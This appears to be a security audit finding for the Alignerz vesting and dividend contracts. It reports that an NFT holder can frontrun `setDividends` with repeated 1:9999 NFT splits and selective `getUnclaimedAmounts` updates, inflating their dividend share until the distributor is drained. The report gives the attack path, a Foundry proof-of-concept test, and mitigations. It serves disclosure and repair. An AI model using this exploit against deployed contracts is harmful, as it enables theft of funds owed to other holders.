# [000805] Dividend Inflation via Frontrunning `setDividends` Through Repeated NFT Splits
  
  ### Summary

The lack of atomic updates to `unclaimedAmountsIn` for all NFTs during dividend distribution will cause a complete drain of stablecoin funds for the protocol as a malicious NFT holder will frontrun `setDividends` by repeatedly splitting their NFT and selectively updating `unclaimedAmountsIn` to artificially inflate their dividend allocation beyond the contract's actual balance.

### Root Cause

In `A26ZDividendDistributor.sol`, the `setDividends()` function calculates dividends based on stale `unclaimedAmountsIn` values that are not atomically refreshed for all NFTs before distribution. The vulnerability arises from two design flaws:

1. **Non-atomic state updates**: The `_setDividends()` internal function distributes dividends using cached `unclaimedAmountsIn[i]` values without forcing a refresh of all NFT amounts first
2. **User-controlled selective updates**: The `getUnclaimedAmounts(uint256 nftId)` function is public and allows any user to update the `unclaimedAmountsIn` for a specific NFT at will
3. **Split mechanics preserve stale state**: When an NFT is split via `AlignerzVesting.splitTVS()`, the resulting NFTs inherit allocation data but their `unclaimedAmountsIn` entries remain at zero until explicitly updated

This combination allows an attacker to manipulate which NFTs have updated values during the critical window between `setAmounts()` and `setDividends()` calls.

[minting new NFTs](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L1086)


[updating unclaimedAmountsIn](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L160)


[updating dividendsOf](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L218)


### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. **Setup**: Attacker owns a legitimate NFT with vesting allocations and waits for the admin to call `setAmounts()` (which sets `stablecoinAmountToDistribute` and `totalUnclaimedAmounts`)
2. **Frontrun Detection**: Attacker monitors the mempool and detects the incoming `setDividends()` transaction from the admin
3. **Rapid NFT Splitting**: Attacker frontruns `setDividends()` by calling `splitTVS()` multiple times (e.g., 5 times) with a 1:9999 split ratio, creating a chain of NFTs where:
   - Old NFT gets 0.01% of the allocation
   - New NFT gets 99.99% of the allocation
4. **Selective Amount Updates**: After each split, attacker calls `getUnclaimedAmounts()` only on the NEW NFT (with 99.99% allocation), deliberately avoiding updates to the old NFTs
5. **Inflation Mechanism**: Each split cycle:
   - Creates a new NFT with nearly the full allocation amount
   - Updates only this new NFT's `unclaimedAmountsIn` value
   - Leaves the old NFT's `unclaimedAmountsIn` at its previous high value
   - The old NFT's stale high value remains counted in `totalUnclaimedAmounts` during the next iteration
6. **Dividend Calculation Manipulation**: When `setDividends()` finally executes, it calculates:
   ```
   dividendsOf[owner].amount += (unclaimedAmountsIn[i] * stablecoinAmountToDistribute / totalUnclaimedAmounts)
   ```
   However, the attacker now owns multiple NFTs with inflated `unclaimedAmountsIn` values that sum to far more than the legitimate total
7. **Fund Extraction**: Attacker calls `claimDividends()` to extract the inflated dividend amount, which exceeds the contract's actual stablecoin balance, draining all available funds


### Impact

The protocol suffers a complete loss of all stablecoin balance held in the `A26ZDividendDistributor` contract. The attacker gains the entire stablecoin balance designated for dividend distribution across all legitimate NFT holders. Other NFT holders suffer a 100% loss of their expected dividends as the contract is drained before they can claim.

In the provided PoC with 10 USDT dropped to the distributor, after 5 split iterations with 1:9999 ratios, the attacker's dividend allocation exceeds 10 USDT while the contract only holds 10 USDT, demonstrating the attack causes the contract to become insolvent.


### PoC

```solidity
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";

function test_Distributor_Drain_POC() public {
    A26ZDividendDistributor public distributor = new A26ZDividendDistributor(address(vesting), address(nft), address(usdt), block.timestamp, 1 days, address(token));
    distributor.transferOwnership(projectCreator);

    vm.startPrank(projectCreator);
    vesting.setVestingPeriodDivisor(1);

    // 1. Launch project
    vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);

    // 2. Create multiple pools with different prices
    vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
    vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
    vesting.createPool(PROJECT_ID, 4_000_000 ether, 0.03 ether, false);

    // 3. Place bids from different whitelisted users
    vesting.addUserToWhitelist(bidders[0], PROJECT_ID);
    vm.stopPrank();

    vm.startPrank(bidders[0]);
    usdt.approve(address(vesting), BIDDER_USD);
    vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
    vm.stopPrank();

    // 4. Prepare bid allocations (this would be done off-chain)
    BidInfo[] memory allBids = new BidInfo[](2);

    for (uint256 i = 0; i < 2; i++) {
        allBids[i] = BidInfo({
            bidder: bidders[i],
            amount: BIDDER_USD,
            vestingPeriod: 60 days,
            poolId: 0,
            accepted: true
        });
    }

    // 6. Generate merkle roots for each pool
    bytes32[] memory poolRoots = new bytes32[](3);
    for (uint256 poolId = 0; poolId < 3; poolId++) {
        poolRoots[poolId] = generateMerkleProofs(allBids, poolId);
    }

    // 7. Finalize project with merkle roots
    vm.prank(projectCreator);
    vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);

    // 8. Users claim NFTs with proofs
    uint256[] memory nftIds = new uint256[](1);
    vm.startPrank(bidders[0]);
    uint256 nftId = vesting.claimNFT(PROJECT_ID, 0, BIDDER_USD, bidderProofs[bidders[0]]);
    nftIds[0] = nftId;
    bidderNFTIds[bidders[0]] = nftId;
    assertEq(nft.ownerOf(nftId), bidders[0]);
    vm.stopPrank();

    // 9. Fast forward time to simulate vesting period
    vm.warp(block.timestamp + 60 days);

    // 10. Dropping 10 tokens to distributor and Admin calls setAmounts
    deal(address(usdt), address(distributor), 10 ether);
    vm.prank(projectCreator);
    distributor.setAmounts();

    // 11. Attacker frontruns setDividends by splitting TVS to multiple NFTs
    vm.startPrank(bidders[0]);
    uint256 splitNumber = 5;
    uint256[] memory percentages = new uint256[](2);
    percentages[0] = 1;
    percentages[1] = 9_999;
    uint256 currentNftId = nftId;
    distributor.getUnclaimedAmounts(currentNftId);
    
    // Repeatedly split and update only the new NFT with 99.99% allocation
    for (uint256 i = 0; i < splitNumber; i++) {
        (uint256 oldNft, uint256[] memory newNft) = vesting.splitTVS(PROJECT_ID, percentages, currentNftId);
        currentNftId = newNft[0];
        // Only update the NEW NFT, leaving old NFT with stale high value
        distributor.getUnclaimedAmounts(currentNftId);
    }
    vm.stopPrank();

    // 12. Admin's setDividends transaction executes after frontrun
    vm.prank(projectCreator);
    distributor.setDividends();

    // 13. User attempts to claim inflated dividends, transaction reverts due to insufficient balance
    // This demonstrates the user's dividend allocation now exceeds the contract's entire balance
    vm.prank(bidders[0]);
    vm.expectRevert();
    distributor.claimDividends();
}
```

### Mitigation

Implement one or more of the following fixes:

### Snapshot mechanism
Implement a snapshot system where `setAmounts()` captures and locks the state of all NFTs at that block, preventing any subsequent updates until after `setDividends()` completes

### Restrict update permissions
Make `getUnclaimedAmounts()` an internal function and only allow updates during controlled operations (splits, claims, distributions)
  